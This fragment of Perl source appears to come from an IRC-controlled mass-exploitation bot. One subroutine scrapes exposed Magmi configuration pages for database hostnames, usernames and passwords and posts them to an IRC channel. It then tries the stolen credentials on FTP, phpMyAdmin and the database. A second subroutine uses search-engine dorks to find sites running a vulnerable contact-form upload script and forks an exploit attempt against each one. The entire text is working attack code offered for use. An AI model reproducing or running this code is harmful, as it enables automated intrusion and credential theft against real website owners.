sub magmi_sql() {
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $html  = &get_content($url);
		if ($html =~ /DB Name:<\/li>/i) {
				my $serverIP   ="";
                           if ($html =~ /host" value="(.*)" ><\/input>/) {$serverIP=$1;}
                           if ($html =~ /user" value="(.*)" ><\/input>/){$user=$1;}
                           if ($html =~ /password" value="(.*)" ><\/input>/){$pass=$1;}
                           if ($html =~ /dbname" value="(.*)" ><\/input>/){$dbname=$1;}
						   &msg("$chan","$mg2logo(7@2$engine15)14http://".$site." 12[+]hostname:2".$serverIP.""); 
						   &msg("$chan","$mg2logo(7@2$engine15)14http://".$site." 12[+]username:2".$user."");
						   &msg("$chan","$mg2logo(7@2$engine15)14http://".$site." 12[+]password:2".$pass.""); 
						   &msg("$chan","$mg2logo(7@2$engine15)14http://".$site." 12[+]dbname  :2".$dbname."");
                           if ($user =~ /_/) {@users = split("_", $user); $usr = $users[0];}
                           my $ceklog = "ftp://".$usr.":".$pass."@".$site."";
                           my $ceklog2 = "ftp://".$user.":".$pass."@".$site."";
						   my $cekpma = "http://".$site."phpMyAdmin";
                           my $ftplog = &get_content($ceklog);
                           my $ftplog2 = &get_content($ceklog2);
                           if ($ftplog =~ /ftp/) {
                           &msg("$channel","12[+]$mg2logo4$engine 12FTP[+] 14ftp://".$site." [+]username:".$usr." [+]password:".$pass."");
                           &msg("$chan","12[+]$mg2logo4$engine 12FTP[+] Success send To Admin");
                           }
                           if ($ftplog2 =~ /ftp/) {
                           &msg("$channel","12[+]$mg2logo4$engine 12FTP[+] 14ftp://".$site." [+]username:".$user." [+]password:".$pass."");
                           &msg("$chan","12[+]$$mg2logo4$engine 12FTP[+] Success send To Admin");
							}
                           if ($html =~ /host" value="localhost" ><\/input>/ || $html =~ /host" value="127.0.0.1" ><\/input>/) {
                           &msg("$channel","12[+]$pmalogo 4$engine 14".$cekpma." [+]username:".$user." [+]password:".$pass."");					   
                           &msg("$chan","12[+]$pmalogo 4$engine 12phpMyAdmin ==> Success send To Admin");
							}							
							my $hosts = "http://".$site;
							if($hosts =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
								$host = $2;
									&dbi_connect($host,$user,$pass,$dbname,$chan,$engine,$mg2logo);sleep(1);
									&msg("$chan","!ftp ".$host." ".$user." ".$pass."");
										if ($dbname =~ /_/) {@users = split("_",$dbname); $dbuser = $users[0]; }
											&ftp_connect($url,$host,$dbuser,$pass,$chan,$engine,$mg2logo);sleep(1);
											&msg("$chan","!ftp ".$host." ".$dbuser." ".$pass."");
			}   }
	    }

sub cfg_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$cfglogo);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$chan","$cfglogo(4@3$engine15)14 Scan finish  15$dork"); }
			my $cfg = "http://".$site."cfg-contactform/inc/upload.php";
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my $coba = &get_content($cfg);sleep(1);
				if ($coba =~ /filename/i || $coba =~ /"filename":" - 001."/i ) {
				    &cfg_xpl($cfg,$chan,$site,$engine);		
				} else { }
            } exit; sleep(2); }
        }
    }
}
